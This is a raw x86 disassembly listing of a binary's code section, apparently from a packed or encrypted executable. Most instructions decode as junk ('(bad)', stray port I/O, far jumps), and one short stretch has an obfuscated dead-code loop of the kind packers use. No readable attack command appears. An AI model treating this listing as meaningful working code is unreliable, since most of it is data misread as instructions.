  4028e3:	xlat   BYTE PTR ds:[ebx]
  4028e4:	jmp    0x34ef55f9
  4028e9:	dec    esi
  4028ea:	leave  
  4028eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028ec:	xchg   edx,eax
  4028ed:	pop    esp
  4028ee:	int3   
  4028ef:	ds dec ebp
  4028f1:	xor    DWORD PTR [ebp+0x390f5c16],esi
  4028f7:	call   0x3835d371
  4028fc:	mov    edx,0xd2ab665b
  402901:	xor    ebp,DWORD PTR [esi]
  402903:	ins    DWORD PTR es:[edi],dx
  402904:	pop    eax
  402905:	cld    
  402906:	cmc    
  402907:	add    eax,0x2086bb81
  40290c:	fwait
  40290d:	rcr    BYTE PTR [edi],0x7a
  402910:	icebp  
  402911:	pop    esi
  402912:	jg     0x402964
  402914:	push   edx
  402915:	retf   0xb852
  402918:	xchg   esp,eax
  402919:	adc    esp,DWORD PTR [edi]
  40291b:	and    ch,0xbf
  40291e:	call   0xb58c2875
  402923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402924:	bound  edi,QWORD PTR [edx+0x49]
  402927:	or     BYTE PTR [eax],bh
  402929:	add    eax,0xa66ca34e
  40292e:	xchg   ecx,eax
  40292f:	in     eax,dx
  402930:	sbb    dh,BYTE PTR [edx]
  402932:	xchg   DWORD PTR [edi+eiz*8-0x67],esi
  402936:	adc    edi,DWORD PTR [ebx]
  402938:	adc    al,BYTE PTR gs:[ecx+0x3f6542f6]
  40293f:	gs or  eax,0x87d82f92
  402945:	mov    edx,0xc7fa3b9a
  40294a:	add    eax,0x434392
  40294f:	pop    edi
  402950:	push   esp
  402951:	add    BYTE PTR [eax],al
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432dde,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43439e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43439e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43439e,edi
  402989:	cmp    DWORD PTR ds:0x43439e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43439e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x43437e
  4029ab:	push   0x4692
  4029b0:	push   0x432738
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432cea
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432de6,0x432dbe
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x43436a,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi+0x257511fc],ah
  402a13:	iret   
  402a14:	arpl   WORD PTR [eax],ax
  402a16:	or     al,0x70
  402a18:	jo     0x4029b1
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x402a87
  402a1e:	mov    bl,0x8e
  402a20:	outs   dx,BYTE PTR ds:[esi]
  402a21:	mov    bx,WORD PTR [edi-0x73]
  402a25:	jns    0x4029ca
  402a27:	iret   
  402a28:	mov    DWORD PTR [edi*4+0x35648412],esp
  402a2f:	pop    edi
  402a30:	(bad)  
  402a31:	fdiv   QWORD PTR [esi-0x76]
  402a34:	sub    bl,0x80
  402a37:	dec    ebx
  402a38:	sub    al,0xc2
  402a3a:	push   cs
  402a3b:	mov    al,ds:0x88a88d07
  402a40:	add    eax,0x456009e6
  402a45:	mov    ecx,0x58f54d57
  402a4a:	xor    eax,DWORD PTR [esi+edx*8+0x68]
  402a4e:	retf   
  402a4f:	imul   eax,DWORD PTR [si],0x12
  402a53:	mov    ebx,0x34be9611
  402a58:	jb     0x402a41
  402a5a:	and    al,0x48
  402a5c:	cmp    WORD PTR [eax-0x6d4bee76],dx
  402a63:	loopne 0x402a1d
  402a65:	pop    esi
  402a66:	(bad)  
  402a67:	mov    ebx,0x20fa7848
  402a6c:	xor    ch,dl
  402a6e:	and    BYTE PTR [esi+0x67],dl
  402a71:	push   esi
  402a72:	push   eax
  402a73:	dec    edx
  402a74:	jbe    0x402ad4
  402a76:	dec    edx
  402a77:	fisttp QWORD PTR ds:[ebx+0x5977b3b4]
  402a7e:	retf   
  402a7f:	lahf   
  402a80:	push   esp
  402a81:	inc    ebp
  402a82:	pusha  
  402a83:	test   al,0xfa
  402a85:	xchg   esp,eax
  402a86:	sbb    bh,BYTE PTR [edx+0x22326684]
  402a8c:	into   
  402a8d:	and    ch,BYTE PTR [edx]
  402a8f:	(bad)  
  402a90:	pop    ebx
  402a91:	aas    
  402a92:	iret   
  402a93:	in     eax,0x4b
  402a95:	(bad)
  402a98:	and    al,0x84
  402a9a:	mov    al,ds:0xb9bbb2d5
  402a9f:	(bad)  
  402aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aa1:	cwde   
  402aa2:	adc    al,dh
  402aa4:	sbb    eax,0xb42be91e
  402aa9:	mov    dl,0xf0
  402aab:	pop    ds
  402aac:	add    DWORD PTR ds:0xcd8f8e69,0x555dc0e1
  402ab6:	mov    esi,0xb237085a
  402abb:	das    
  402abc:	shr    BYTE PTR [esi+0x26],cl
  402abf:	shl    DWORD PTR [ebx+0x68],0x71
  402ac3:	dec    edi
  402ac4:	imul   ebx,DWORD PTR [edi],0x7f
  402ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ac8:	cmp    ecx,ebx
  402aca:	in     al,dx
  402acb:	dec    ebx
  402acc:	push   edi
  402acd:	xor    DWORD PTR [ebx],edi
  402acf:	mov    bl,BYTE PTR [ebp-0x3ef481cb]
  402ad5:	mov    edi,esi
  402ad7:	xchg   esi,eax
  402ad8:	mov    ds:0xf3d19661,eax
  402add:	mov    cl,bh
  402adf:	or     ebp,edi
  402ae1:	int3   
  402ae2:	mov    al,ds:0x7e57112d
  402ae7:	pop    ds
  402ae8:	mov    ebp,ebx
  402aea:	xchg   ebp,eax
  402aeb:	jge    0x402a79
  402aed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aee:	inc    esi
  402aef:	aad    0x10
  402af1:	test   esp,esp
  402af3:	adc    edx,DWORD PTR [edi+0x3a689fd8]
  402af9:	rol    BYTE PTR [edi+0x7c],1
  402afc:	cmp    eax,DWORD PTR [esi+0x4b280c82]
  402b02:	xlat   BYTE PTR ds:[ebx]
  402b03:	aam    0x92
  402b05:	push   ds
  402b06:	or     DWORD PTR [esi],edx
  402b08:	jae    0x402b1f
  402b0a:	push   ds
  402b0b:	popf   
  402b0c:	pop    esi
  402b0d:	les    esi,FWORD PTR ds:0xa6de56aa
  402b13:	and    BYTE PTR [ebx+ebp*4-0x18],bh
  402b17:	cmc    
  402b18:	mov    ah,0xe6
  402b1a:	mov    al,ds:0x31169028
  402b1f:	add    eax,0xdb1518f1
  402b24:	sub    BYTE PTR [edi],bh
  402b26:	mov    bh,0xf9
  402b28:	mov    edx,0x84fd25a7
  402b2d:	mov    dh,0x4f
  402b2f:	and    BYTE PTR ds:0xbe4e8d19,al
  402b35:	pop    ebx
  402b36:	sahf   
  402b37:	xor    al,0xd2
  402b39:	or     dl,ch
  402b3b:	fmul   st,st(5)
  402b3d:	push   edi
  402b3e:	fisubr DWORD PTR [ebp-0x43]
  402b41:	pop    edx
  402b42:	xchg   esi,eax
  402b43:	xlat   BYTE PTR ds:[ebx]
  402b44:	out    dx,eax
  402b45:	mov    ch,0xfd
  402b47:	mov    ss,eax
  402b49:	add    dl,BYTE PTR fs:[esi+0x1f]
  402b4d:	inc    esp
  402b4e:	dec    esi
  402b4f:	mov    dh,0xd5
  402b51:	adc    cl,BYTE PTR [esi+esi*4]
  402b54:	push   edi
  402b55:	in     al,0x2b
  402b57:	out    dx,eax
  402b58:	in     eax,dx
  402b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b5a:	iret   
  402b5b:	dec    edi
  402b5c:	dec    esi
  402b5d:	pop    es
  402b5e:	lea    esp,ss:[ecx+edx*8]
  402b62:	inc    esp
  402b63:	xchg   dh,ch
  402b65:	sahf   
  402b66:	das    
  402b67:	cdq    
  402b68:	call   0x119dd2f7
  402b6d:	mov    edx,es
  402b6f:	fstp   DWORD PTR [ecx+0xa1e2ca3]
  402b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b76:	test   DWORD PTR [esp-0x6b],edi
  402b7a:	dec    ecx
  402b7b:	mov    al,al
  402b7d:	pop    esp
  402b7e:	or     cl,BYTE PTR [edi-0x452f81c7]
  402b84:	pushf  
  402b85:	xchg   esi,eax
  402b86:	push   ds
  402b87:	ja     0x402bd1
  402b89:	pop    es
  402b8a:	add    bl,bh
  402b8c:	std    
  402b8d:	popa   
  402b8e:	into   
  402b8f:	mov    ds,WORD PTR [eax]
  402b91:	das    
  402b92:	push   0xffffff93
  402b94:	(bad)  
  402b96:	cmp    ebp,DWORD PTR [ebp-0x77]
  402b99:	jmp    0x402b98
  402b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b9c:	ins    DWORD PTR es:[edi],dx
  402b9d:	push   es
  402b9e:	xor    dh,BYTE PTR [esi]
  402ba0:	mov    BYTE PTR [ebx+0x1c],dh
  402ba3:	jecxz  0x402bac
  402ba5:	sub    BYTE PTR [edi+0x151912d9],dh
  402bab:	adc    ch,BYTE PTR [ebx]
  402bad:	adc    ebp,DWORD PTR [edi-0x5b]
  402bb0:	daa    
  402bb1:	(bad)  
  402bb2:	cmp    dl,ch
  402bb4:	cmc    
  402bb5:	mov    esp,0x48306ea3
  402bba:	add    eax,0xbb12c274
  402bbf:	in     eax,dx
  402bc0:	dec    edi
  402bc1:	into   
  402bc2:	push   edx
  402bc3:	jnp    0x402bbd
  402bc5:	xchg   ecx,eax
  402bc6:	jle    0x402b7d
  402bc8:	adc    eax,0x6a0a39c8
  402bcd:	aas    
  402bce:	dec    edx
  402bcf:	xchg   BYTE PTR [edi],ah
  402bd1:	push   edx
  402bd2:	fcomp  DWORD PTR ds:0xae618cdf
  402bd8:	sbb    BYTE PTR [eax+0xac48e68],bl
  402bde:	out    0x5e,al
  402be0:	call   FWORD PTR [edi]
  402be2:	jmp    0x402bfc
  402be4:	xchg   ebx,eax
  402be5:	sti    
  402be6:	add    al,0x3f
  402be8:	stos   BYTE PTR es:[edi],al
  402be9:	or     ah,ah
  402beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bec:	stos   BYTE PTR es:[edi],al
  402bed:	ins    DWORD PTR es:[edi],dx
  402bee:	jo     0x402c6e
  402bf0:	pop    edx
  402bf1:	out    dx,al
  402bf2:	mov    ebp,0x82ab3649
  402bf7:	test   esp,eax
  402bf9:	ss dec ecx
  402bfb:	out    0x93,al
  402bfd:	inc    edi
  402bfe:	sub    bl,BYTE PTR [eax]
  402c00:	mov    ecx,0xce71ca01
  402c05:	rcr    BYTE PTR [eax],0x29
  402c08:	sbb    ah,0x45
  402c0b:	enter  0xa25a,0x55
  402c0f:	arpl   bp,bx
  402c11:	imul   eax,DWORD PTR [esi],0xffffffd4
  402c14:	jge    0x402c1f
  402c16:	mov    dl,0x5e
  402c18:	mov    eax,0xe3613ffb
  402c1d:	std    
  402c1e:	sti    
  402c1f:	loop   0x402bb9
  402c21:	loop   0x402be6
  402c23:	mov    ch,0x38
  402c25:	xchg   ebp,eax
  402c26:	inc    esi
  402c27:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  402c29:	imul   eax,DWORD PTR [esi],0x79
  402c2c:	inc    edi
  402c2d:	cmp    BYTE PTR [edx+0x5c],0xb1
  402c31:	xchg   ebx,eax
  402c32:	shl    DWORD PTR ds:0x2b3d89e6,0x74
  402c39:	add    eax,0xd2135ba0
  402c3e:	inc    edx
  402c3f:	jno    0x402c8a
  402c41:	mov    esi,gs
  402c43:	int3   
  402c44:	fidiv  WORD PTR [edx+0x17447d9a]
  402c4a:	mov    DWORD PTR [ecx-0x30],ebx
  402c4d:	jmp    0x402bfb
  402c4f:	aad    0x5f
  402c51:	aad    0xf1
  402c53:	mov    ch,0x8e
  402c55:	gs imul ebx,esp,0xfffffff0
  402c59:	fsubr  DWORD PTR [eax-0x3]
  402c5c:	xor    eax,0x33654b9f
  402c61:	inc    esi
  402c62:	xchg   esi,eax
  402c63:	jne    0x402c80
  402c65:	or     BYTE PTR [ebp-0x493325e3],al
  402c6b:	dec    esp
  402c6c:	lock adc al,0xd8
  402c6f:	in     eax,0xba
  402c71:	pusha  
  402c72:	mov    DWORD PTR ds:0x4372f18d,esp
  402c78:	push   edi
  402c79:	dec    esi
  402c7a:	ret    
  402c7b:	(bad)  
  402c7c:	and    DWORD PTR [edi+0x241f22f],ecx
  402c82:	and    edx,DWORD PTR [edx+0x6fb02076]
  402c88:	clc    
  402c89:	jg     0x402cd0
  402c8b:	pop    ecx
  402c8c:	shr    DWORD PTR [eax+0x36],0xa6
  402c90:	sbb    ah,BYTE PTR [ebx+ebx*4-0x16]
  402c94:	lds    ecx,FWORD PTR [edx-0x42]
  402c97:	mov    DWORD PTR [esi+esi*4+0x6c],esp
  402c9b:	mov    al,0xca
  402c9d:	inc    edi
  402c9e:	push   ebx
  402c9f:	xchg   edx,eax
  402ca0:	mov    bl,al
  402ca2:	out    dx,al
  402ca3:	add    cl,BYTE PTR [ebx+0x76]
  402ca6:	cli    
  402ca7:	and    eax,0xc80329c0
  402cac:	sbb    al,0x64
  402cae:	out    0x2f,eax
  402cb0:	xchg   edx,eax
  402cb1:	jb     0x402c8f
  402cb3:	xor    BYTE PTR [edx+eiz*8+0x64c391bc],0x30
  402cbb:	gs fdiv st(1),st
  402cbe:	jb     0x402cac
  402cc0:	or     eax,0xdfa11e2a
  402cc5:	jecxz  0x402ca4
  402cc7:	jo     0x402cd0
  402cc9:	ja     0x402c85
  402ccb:	or     ah,al
  402ccd:	jmp    0x5351a33c
  402cd2:	aas    
  402cd3:	pop    ebp
  402cd4:	sahf   
  402cd5:	mov    esp,0xd98183dd
  402cda:	mov    edi,0xc7661958
  402cdf:	outs   dx,DWORD PTR ds:[esi]
  402ce0:	neg    BYTE PTR [eax+0x6c66899b]
  402ce6:	js     0x402d34
  402ce8:	add    ebp,DWORD PTR [ecx-0x7365a006]
  402cee:	xchg   DWORD PTR [edx],ebx
  402cf0:	mov    edi,0xa9ff26fe
  402cf5:	xchg   edx,eax
  402cf6:	repz cmp BYTE PTR [edx+0x2c],bh
  402cfa:	das    
  402cfb:	inc    ebx
  402cfc:	xchg   ebx,eax
  402cfd:	mov    ebp,0x4dc75be1
  402d02:	pop    ecx
  402d03:	or     esi,ebx
  402d05:	mov    al,ds:0x6e8a9647
  402d0a:	aaa    
  402d0b:	xor    edi,DWORD PTR [eax]
  402d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d0e:	sub    cl,cl
  402d10:	pop    esi
  402d11:	dec    esi
  402d12:	mov    ebp,0xa64094c2
  402d17:	fcom   DWORD PTR [eax-0x70646e98]
  402d1d:	push   cs
  402d1e:	adc    eax,0xc3606675
  402d23:	inc    esp
  402d24:	cli    
  402d25:	mov    bl,0xbf
  402d27:	lods   eax,DWORD PTR ds:[esi]
  402d28:	jnp    0x402ccb
  402d2a:	nop
  402d2b:	sub    bl,0x7e
  402d2e:	rcr    BYTE PTR [eax-0x22d87ba8],0x8b
  402d35:	sub    eax,0x9ddf8b52
  402d3a:	jecxz  0x402db5
  402d3c:	mov    esi,0x69196850
  402d41:	mov    al,0x61
  402d43:	push   es
  402d44:	cvttps2pi mm5,xmm3
  402d47:	fistp  QWORD PTR [ecx-0x3f]
  402d4a:	sti    
  402d4b:	push   cs
  402d4c:	bnd jb 0x402d67
  402d4f:	adc    edi,DWORD PTR [eax]
  402d51:	xor    al,0x9e
  402d53:	loope  0x402d5f
  402d55:	mov    esp,0x99f4810d
  402d5a:	pop    eax
  402d5b:	sub    eax,0x94b0e73a
  402d60:	or     ebx,DWORD PTR [eax]
  402d62:	sub    BYTE PTR [ebp+0x26],dl
  402d65:	in     al,dx
  402d66:	dec    esp
  402d67:	jp     0x402d52
  402d69:	inc    ebp
  402d6a:	lock retf 
  402d6c:	daa    
  402d6d:	idiv   BYTE PTR [ebx-0x6fb0c804]
  402d73:	dec    eax
  402d74:	dec    esi
  402d75:	inc    esi
  402d76:	xchg   edi,eax
  402d77:	sbb    DWORD PTR [edi],esp
  402d79:	push   ss
  402d7a:	pop    ss
  402d7b:	adc    eax,0xfa509ab1
  402d80:	(bad)  
  402d81:	jno    0x402d61
  402d83:	xchg   edi,eax
  402d84:	pop    eax
  402d85:	adc    ah,ch
  402d87:	shl    DWORD PTR [edx],cl
  402d89:	jle    0x402dce
  402d8b:	dec    edi
  402d8c:	sbb    BYTE PTR [edi],bl
  402d8e:	cmp    bh,BYTE PTR [ebp+0x6eeeda2c]
  402d94:	dec    edx
  402d95:	leave  
  402d96:	jnp    0x402dd5
  402d98:	inc    eax
  402d99:	das    
  402d9a:	frstor ds:[ebp+0x6908ba83]
  402da1:	(bad)  
  402da2:	in     al,dx
  402da3:	mov    WORD PTR [ebx-0x1c],ds
  402da6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402da7:	push   ebx
  402da8:	xchg   ch,ah
  402daa:	mov    ecx,0xbe145a86
  402daf:	sbb    esp,esi
  402db1:	mov    bl,0xe2
  402db3:	inc    esp
  402db4:	enter  0x8b9a,0x7d
  402db8:	cld    
  402db9:	jmp    0x40316f
  402dbe:	cs out dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	mov    dh,0xf9
  402dcc:	fst    DWORD PTR ds:0x707009a7
  402dd2:	xchg   edi,eax
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402d5e
  402dd7:	mov    esp,0x500335fa
  402ddc:	dec    ecx
  402ddd:	mov    ds:0xc8d1937b,al
  402de2:	and    eax,0x5a1d9041
  402de7:	lods   eax,DWORD PTR ds:[esi]
  402de8:	xor    al,0xa3
  402dea:	jl     0x402de2
  402dec:	xor    ebx,DWORD PTR ds:0x3ed20ac1
  402df2:	cdq    
  402df3:	pop    ss
  402df4:	add    BYTE PTR [edx-0x50],0xf
  402df8:	(bad)  
  402df9:	cmp    eax,0x39e61f53
  402dfe:	fwait
  402dff:	push   esi
  402e00:	push   ecx
  402e01:	and    ecx,0x42
  402e04:	stc    
  402e05:	in     ax,0xbf
  402e08:	out    dx,al
  402e09:	mov    cl,0x7d
  402e0b:	leave  
  402e0c:	pop    ds
  402e0d:	rol    bl,1
  402e0f:	pop    esp
  402e10:	mov    ecx,0x9450a322
  402e15:	enter  0x4e64,0xa3
  402e19:	lods   al,BYTE PTR ds:[esi]
  402e1a:	inc    eax
  402e1b:	dec    esp
  402e1c:	daa    
  402e1d:	lds    eax,FWORD PTR [ecx]
  402e1f:	mov    BYTE PTR [ebx-0xe8022d5],cl
  402e25:	cli    
  402e26:	enter  0x84a,0x6d
  402e2a:	shl    esi,cl
  402e2c:	add    DWORD PTR [ebx],esi
  402e2e:	xchg   esp,eax
  402e2f:	inc    ecx
  402e30:	repnz cmp BYTE PTR [eax-0x4e],bh
  402e34:	lock jp 0x402e6e
  402e37:	push   0xff4210e4
  402e3c:	push   es
  402e3d:	in     al,0x4
  402e3f:	sub    esi,DWORD PTR [ecx]
  402e41:	xchg   esi,eax
  402e42:	inc    ecx
  402e43:	adc    ch,cl
  402e45:	(bad)  
  402e46:	push   ebp
  402e47:	cmp    BYTE PTR [edx-0x2770ba5e],ch
  402e4d:	sub    edx,DWORD PTR [ecx-0x2e]
  402e50:	inc    ecx
  402e51:	push   ebx
  402e52:	lea    eax,[edi]
  402e54:	adc    dl,BYTE PTR [ebx-0x8712eb4]
  402e5a:	shl    ebx,cl
  402e5c:	jp     0x402e24
  402e5e:	jns    0x402e7e
  402e60:	call   0x1ff3:0x51fe5fb3
  402e67:	or     eax,0x6c5825e1
  402e6c:	mov    BYTE PTR [eax],cl
  402e6e:	fcom   QWORD PTR [ecx-0x70]
  402e71:	dec    esi
  402e72:	fs ja  0x402e1c
  402e75:	sub    bl,BYTE PTR [ebx]
  402e77:	test   al,0xf8
  402e79:	jno    0x402e93
  402e7b:	stos   BYTE PTR es:[edi],al
  402e7c:	or     al,0xb
  402e7e:	ret    
  402e7f:	mov    dh,0x6c
  402e81:	retf   0x4461
  402e84:	lahf   
  402e85:	pop    esi
  402e86:	xchg   ebx,eax
  402e87:	adc    edx,esi
  402e89:	mov    ds:0x2c30a258,eax
  402e8e:	jmp    0xf34a:0xafdbd1a5
  402e95:	mov    cl,0x52
  402e97:	and    DWORD PTR [ebp-0x47],ebx
  402e9a:	jmp    0xac6b:0xf7efae5e
  402ea1:	les    esi,FWORD PTR [eax-0x3178e64c]
  402ea7:	lods   al,BYTE PTR ds:[esi]
  402ea8:	fisub  DWORD PTR [edx]
  402eaa:	paddb  mm6,QWORD PTR [ebx]
  402ead:	sub    al,0xca
  402eaf:	xor    DWORD PTR [edi+0x33],0x64325036
  402eb6:	das    
  402eb7:	fistp  DWORD PTR [edx]
  402eb9:	push   ss
  402eba:	outs   dx,BYTE PTR ds:[esi]
  402ebb:	ds pop ss
  402ebd:	or     al,0x24
  402ebf:	gs inc esi
  402ec1:	sub    DWORD PTR [edi-0x4c],ebx
  402ec4:	(bad)  
  402ec5:	push   esp
  402ec6:	push   0x621c99c9
  402ecb:	fsub   st(3),st
  402ecd:	call   0xda81618
  402ed2:	sub    al,dl
  402ed4:	(bad)  
  402ed5:	in     eax,dx
  402ed6:	jecxz  0x402f15
  402ed8:	jae    0x402f3a
  402eda:	es mov esp,0x593600be
  402ee0:	sbb    ebp,DWORD PTR [edx-0x48bca719]
  402ee6:	or     DWORD PTR [ecx+0xaa7b637],ebx
  402eec:	(bad)  
  402eed:	aam    0x9e
  402eef:	sti    
  402ef0:	sbb    eax,0xcf005b61
  402ef5:	stos   DWORD PTR es:[edi],eax
  402ef6:	jge    0x402eeb
  402ef8:	adc    dh,ch
  402efa:	jnp    0x402e8b
  402efc:	pop    esi
  402efd:	push   es
  402efe:	es stos BYTE PTR es:[edi],al
  402f00:	xlat   BYTE PTR ds:[ebx]
  402f01:	mov    bh,0x1
  402f03:	mov    dl,0x54
  402f05:	test   eax,0xbcb7147d
  402f0a:	loopne 0x402f4c
  402f0c:	pop    ss
  402f0d:	jecxz  0x402f28
  402f0f:	mov    BYTE PTR [eax-0x68],al
  402f12:	retf   
  402f13:	or     ebp,DWORD PTR [ebx-0xb]
  402f16:	pop    ss
  402f17:	add    al,dl
  402f19:	sub    ch,al
  402f1b:	scas   eax,DWORD PTR es:[edi]
  402f1c:	adc    DWORD PTR [eax-0xc02136d],ebx
  402f22:	pop    ebx
  402f23:	mov    esi,DWORD PTR [ebx-0x4f]
  402f26:	add    eax,0x916fb0d7
  402f2b:	jnp    0x402edb
  402f2d:	add    ebp,DWORD PTR [esi]
  402f2f:	pop    edi
  402f30:	mov    ebp,0x3fbc38b7
  402f35:	push   esp
  402f36:	mov    ebx,0x2239e3b1
  402f3b:	int    0x5b
  402f3d:	mov    esp,0x7f2c8fbb
  402f42:	hlt    
  402f43:	int    0xc5
  402f45:	(bad)  
  402f46:	int3   
  402f47:	cmp    DWORD PTR [edx+ebp*4+0x5e],esp
  402f4b:	mov    esi,0x79009016
  402f50:	and    ch,dh
  402f52:	jl     0x402f22
  402f54:	ins    DWORD PTR es:[edi],dx
  402f55:	int    0x8
  402f57:	jl     0x402fb1
  402f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f5a:	pushf  
  402f5b:	sub    DWORD PTR [esi-0x21],edx
  402f5e:	jg     0x402fb0
  402f60:	sub    ecx,DWORD PTR [ebp-0x64ab1b19]
  402f66:	rcl    dl,1
  402f68:	or     al,0xe6
  402f6a:	push   cs
  402f6b:	jnp    0x402fea
  402f6d:	lods   eax,DWORD PTR ds:[esi]
  402f6e:	cmp    BYTE PTR [ecx-0x31f46253],0x65
  402f75:	add    BYTE PTR [edi+0x79],cl
  402f78:	imul   edx,edx,0xffffffe2
  402f7b:	cli    
  402f7c:	mov    ecx,DWORD PTR [eax+0x74]
  402f7f:	jne    0x402fcf
  402f81:	lea    esi,[edi]
  402f83:	fist   WORD PTR [esi+0x5ebb16d]
  402f89:	add    ebx,ecx
  402f8b:	xchg   ebp,eax
  402f8c:	ret    0xd405
  402f8f:	cmp    esi,0xfffffff9
  402f92:	pop    ebp
  402f93:	es arpl ax,bp
  402f96:	push   0xffffff90
  402f98:	mov    cl,0x0
  402f9a:	lods   al,BYTE PTR ds:[esi]
  402f9b:	pop    edx
  402f9c:	inc    edx
  402f9d:	sub    DWORD PTR [edx+0x4dc17113],edx
  402fa3:	aaa    
  402fa4:	pop    ecx
  402fa5:	cmp    al,0xdc
  402fa7:	add    DWORD PTR [ecx+0x695e1d76],0x3e
  402fae:	xchg   esi,eax
  402faf:	adc    al,0x3d
  402fb1:	jo     0x402f3e
  402fb3:	cs sti 
  402fb5:	xchg   al,dh
  402fb7:	add    eax,0x3a4f754f
  402fbc:	ficomp DWORD PTR [ecx+0x2d600f79]
  402fc2:	push   ds
  402fc3:	inc    esi
  402fc4:	sub    BYTE PTR [esi+0x14],cl
  402fc7:	scas   eax,DWORD PTR es:[edi]
  402fc8:	add    ah,dh
  402fca:	aam    0xd6
  402fcc:	pop    edx
  402fcd:	lds    edx,FWORD PTR [edx+0x7dd49330]
  402fd3:	ret    
  402fd4:	fidivr WORD PTR [esp+esi*1]
  402fd7:	in     eax,dx
  402fd8:	dec    DWORD PTR [esi]
  402fda:	add    DWORD PTR [edx],eax
  402fdc:	sub    bh,BYTE PTR [esi+ebp*8-0x46]
  402fe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fe1:	inc    ebp
  402fe2:	jg     0x402fd1
  402fe4:	call   0x282fa889
  402fe9:	push   es
  402fea:	fimul  WORD PTR [ecx]
  402fec:	adc    edi,DWORD PTR [ecx]
  402fee:	retf   0x2317
  402ff1:	(bad)  
  402ff2:	aam    0x67
  402ff4:	pop    edx
  402ff5:	pushf  
  402ff6:	daa    
  402ff7:	in     al,0x59
  402ff9:	xchg   cl,dh
  402ffb:	shl    DWORD PTR [ebx+0x23],0xf1
  402fff:	and    bl,bh
  403001:	popf   
  403002:	sub    bl,BYTE PTR [ecx]
  403004:	xchg   esp,eax
  403005:	xor    al,cl
  403007:	sub    DWORD PTR [ebp-0x29],esp
  40300a:	lods   al,BYTE PTR ds:[esi]
  40300b:	mov    bh,0x7a
  40300d:	jecxz  0x402fc0
  40300f:	xchg   esi,eax
  403010:	fidivr DWORD PTR [edi]
  403012:	in     al,dx
  403013:	loop   0x403019
  403015:	idiv   bh
  403017:	push   es
  403018:	mov    ds:0xe5cd798a,al
  40301d:	les    ecx,FWORD PTR [ecx-0x5fbfc772]
  403023:	adc    eax,0x3b46616
  403028:	sbb    BYTE PTR [edx],0x93
  40302b:	sub    BYTE PTR [ebx-0x7c],cl
  40302e:	repz (bad) 
  403030:	or     DWORD PTR [edi],edi
  403032:	sti    
  403033:	mov    eax,0x53140a41
  403038:	std    
  403039:	fstp   QWORD PTR [esi+ecx*4]
  40303c:	ss test eax,0x37f06a61
  403042:	neg    BYTE PTR [ebx+0x53]
  403045:	imul   edx,edi,0x2deb3ae9
  40304b:	fisttp QWORD PTR ds:0xa55accf5
  403051:	mov    ebp,0x8fde4d12
  403056:	mov    edi,edi
  403058:	outs   dx,DWORD PTR ds:[esi]
  403059:	test   DWORD PTR [ebp+0xe1d05c4],esi
  40305f:	ret    
  403060:	rol    DWORD PTR [esi],cl
  403062:	fist   DWORD PTR [edi-0x26]
  403065:	add    al,0x68
  403067:	(bad)  
  403068:	hlt    
  403069:	jo     0x4030c7
  40306b:	(bad)  
  40306c:	aaa    
  40306d:	je     0x4030bc
  40306f:	test   DWORD PTR [edi-0x25],edi
  403072:	loope  0x403002
  403074:	daa    
  403075:	pop    es
  403076:	mov    ds:0xc84f5c30,al
  40307b:	ss addr16 cs in eax,dx
  40307f:	shr    BYTE PTR [esi+0x25],1
  403082:	lods   eax,DWORD PTR ds:[esi]
  403083:	fild   DWORD PTR [edx+ebp*2]
  403086:	fistp  WORD PTR [ebx]
  403088:	inc    edi
  403089:	dec    ebx
  40308a:	sbb    al,0xe2
  40308c:	popa   
  40308d:	pop    esp
  40308e:	inc    eax
  40308f:	js     0x4030d0
  403091:	xor    BYTE PTR [edx-0x76],al
  403094:	and    eax,0x9cde3ed0
  403099:	mov    bl,0xb2
  40309b:	fs retf 0x6614
  40309f:	hlt    
  4030a0:	sub    dl,BYTE PTR [bx]
  4030a3:	lods   al,BYTE PTR ds:[esi]
  4030a4:	in     al,dx
  4030a5:	dec    esi
  4030a6:	cmp    DWORD PTR [edx+0x23f5f229],0x87fe79e6
  4030b0:	ror    DWORD PTR [ebp+0x33cb2096],1
  4030b6:	jmp    0xbc3cac20
